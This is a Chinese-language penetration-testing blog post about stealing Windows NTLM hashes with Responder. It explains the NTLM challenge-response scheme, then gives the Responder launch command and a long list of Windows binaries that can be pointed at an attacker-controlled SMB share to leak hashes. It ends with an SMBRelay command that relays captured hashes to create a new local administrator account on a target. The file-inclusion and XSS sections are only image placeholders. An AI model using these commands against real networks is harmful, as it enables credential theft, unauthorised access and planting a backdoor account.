+++
title = "Responder与NTML hash"
topics = ["Pentest"]
tags = ["intranet"]
description = "获取windows的hash"
date = "2018-09-10T09:48:10+08:00"
draft = false
+++

### 0x00 一些概念
* Windows认证协议  
分为：基于NTML的认证和基于kerberos的认证

* 什么是NTLM Hash？  
早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash

* 什么是Challenge-Response挑战/响应验证机制？  
    * Client输入username、password、domain，然后将密码hash后存在本地，并将username发送到Server
    * DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client
    * Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server
    * Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证

* 关于Responder  
由Laurent Gaffie撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括Net-NTLM哈希）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要哈希。Responder也有能力攻击LLMNR，NBT-NS和mDNS等协议。

* 什么是NTLM中继攻击？  
攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。

### 0x01 软件环境
* 可以从[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder?_blank)下载Responder
* 目标机：Win7（10.11.11.20）
* 本机：Ubuntu14.04（10.11.11.11）
* 本机执行：$ sudo python Responder.py -I en0 -rdwv

### 0x02 通过SMB服务获取NTLM哈希   
对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash

```bash
net.exe use \\host\share
attrib.exe \\host\share
bcdboot.exe \\host\share
bdeunlock.exe \\host\share
cacls.exe \\host\share
certreq.exe \\host\share #(noisy, pops an error dialog)
certutil.exe \\host\share
cipher.exe \\host\share
ClipUp.exe -l \\host\share
cmdl32.exe \\host\share
cmstp.exe /s \\host\share
colorcpl.exe \\host\share #(noisy, pops an error dialog)
comp.exe /N=0 \\host\share \\host\share
compact.exe \\host\share
control.exe \\host\share
convertvhd.exe -source \\host\share -destination \\host\share
Defrag.exe \\host\share
DeployUtil.exe /install \\host\share
DevToolsLauncher.exe GetFileListing \\host\share #(this one's cool. will return a file listing (json-formatted) from remote SMB share...)
diskperf.exe \\host\share
dispdiag.exe -out \\host\share
doskey.exe /MACROFILE=\\host\share
esentutl.exe /k \\host\share
expand.exe \\host\share
extrac32.exe \\host\share
FileHistory.exe \\host\share #(noisy, pops a gui)
findstr.exe * \\host\share
fontview.exe \\host\share #(noisy, pops an error dialog)
fvenotify.exe \\host\share #(noisy, pops an access denied error)
FXSCOVER.exe \\host\share #(noisy, pops GUI)
hwrcomp.exe -check \\host\share
hwrreg.exe \\host\share
icacls.exe \\host\share
LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)
licensingdiag.exe -cab \\host\share
lodctr.exe \\host\share
lpksetup.exe /p \\host\share /s
makecab.exe \\host\share
MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)
mshta.exe \\host\share #(noisy, pops an HTA window)
msiexec.exe /update \\host\share /quiet
msinfo32.exe \\host\share #(noisy, pops a "cannot open" dialog)
mspaint.exe \\host\share #(noisy, invalid path to png error)
mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)
msra.exe /openfile \\host\share #(noisy, error)
mstsc.exe \\host\share #(noisy, error)
netcfg.exe -l \\host\share -c p -i foo
```
![90](/img/post/20180911-124855.png)

### 0x03 通过文件包含获取NTLM哈希
![90](/img/post/20180911-132027.png)

### 0x04 通过XSS获取NTLM哈希
![90](/img/post/20180911-163241.png)



### 0x04 利用SMB Relay模块进行中继攻击从而RCE
这里就用到了NTLM中继攻击，相当于是中间人攻击，假如说有A和B两台主机，攻击者用将获取高权限的主机B的hash，将hash转发给低权限主机A并执行命令

#./SMBRelay.py -t 192.168.3.251 -c "net user vuln pass /ADD && net localgroup administrators vuln /add" -t 192.168.3.5 -u Administrator




<br>
#### Reference(侵删)：
* [https://apt404.github.io/2016/08/11/ntlm-kerberos](https://apt404.github.io/2016/08/11/ntlm-kerberos?_blank)
* [http://www.4hou.com/system/9383.html](http://www.4hou.com/system/9383.html?_blank)
* [https://3gstudent.github.io/Windows下的密码NTLM-hash和Net-NTLM-hash介绍](https://3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍/?_blank)
* [https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e](https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e?_blank)
* [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes?_blank)
* [https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/?_blank)
* [https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745?_blank)
